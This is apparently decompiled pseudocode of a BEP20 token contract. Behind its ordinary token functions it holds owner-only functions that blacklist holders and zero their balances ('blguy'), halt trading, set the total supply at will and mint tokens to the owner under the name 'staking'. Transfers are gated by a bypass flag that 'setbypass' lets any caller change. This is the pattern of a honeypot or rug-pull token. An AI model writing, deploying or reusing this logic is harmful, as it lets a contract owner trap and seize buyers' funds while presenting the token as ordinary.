contract main {




// =====================  Runtime code  =====================


address owner;
mapping of uint256 balances;
mapping of uint256 allowance;
mapping of uint8 stor4;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
uint256 totalSupply;
uint8 stor9;
uint8 stor9; offset 8
uint256 stor9; offset 8

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function balances(address arg1) {
    return balances[arg1]
}

function decimals() {
    return decimals
}

function balanceOf(address arg1) {
    return balances[address(arg1)]
}

function owner() {
    return owner
}

function sub_95d08416(?) {
    return bool(uint8(stor9.field_8))
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    return allowance[address(arg1)][address(arg2)]
}

function sub_e0f4f0b0(?) {
    return bool(uint8(stor9.field_0))
}

function isbb(address arg1) {
    return bool(stor4[address(arg1)])
}

function _fallback() payable {
    revert
}

function setbypass(bool arg1) {
    Mask(248, 0, stor9.field_8) = Mask(248, 0, arg1)
}

function totalsup(uint256 arg1) {
    require msg.sender == owner
    totalSupply = arg1
    return 0
}

function isTrading(bool arg1) {
    require msg.sender == owner
    uint8(stor9.field_0) = uint8(arg1)
}

function rlguy(address arg1) {
    require msg.sender == owner
    stor4[address(arg1)] = 0
    return 0
}

function blguy(address arg1) {
    require msg.sender == owner
    stor4[address(arg1)] = 1
    balances[address(arg1)] = 0
    return 1
}

function approve(address arg1, uint256 arg2) {
    if arg2:
        if allowance[address(msg.sender)][address(arg1)]:
            return 0
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function burn(uint256 arg1) {
    require msg.sender == owner
    require arg1 <= balances[address(msg.sender)]
    require arg1 <= balances[address(msg.sender)]
    balances[address(msg.sender)] -= arg1
    require arg1 <= totalSupply
    totalSupply -= arg1
    emit Burn(arg1, msg.sender);
}

function staking(uint256 arg1) {
    require msg.sender == owner
    if arg1 <= 0:
        revert with 0, 'BEP20: Cannot stake 0 Token'
    if not msg.sender:
        revert with 0, 'BEP20: Stake to This Contract'
    require balances[address(msg.sender)] + arg1 >= balances[address(msg.sender)]
    balances[address(msg.sender)] += arg1
    emit Transfer(arg1, 0, msg.sender);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size >= 68
    require arg1
    require arg2 <= balances[address(msg.sender)]
    if not uint8(stor9.field_8):
        require uint8(stor9.field_0)
        require not stor4[address(msg.sender)]
    require arg2 <= balances[address(msg.sender)]
    balances[address(msg.sender)] -= arg2
    require balances[address(arg1)] + arg2 >= balances[address(arg1)]
    balances[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size >= 100
    require arg2
    require arg3 <= balances[address(arg1)]
    require arg3 <= allowance[address(arg1)][address(msg.sender)]
    if not uint8(stor9.field_8):
        require uint8(stor9.field_0)
        require not stor4[address(msg.sender)]
    require arg3 <= balances[address(arg1)]
    balances[address(arg1)] -= arg3
    require arg3 <= allowance[address(arg1)][address(msg.sender)]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    require balances[address(arg2)] + arg3 >= balances[address(arg2)]
    balances[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}



}
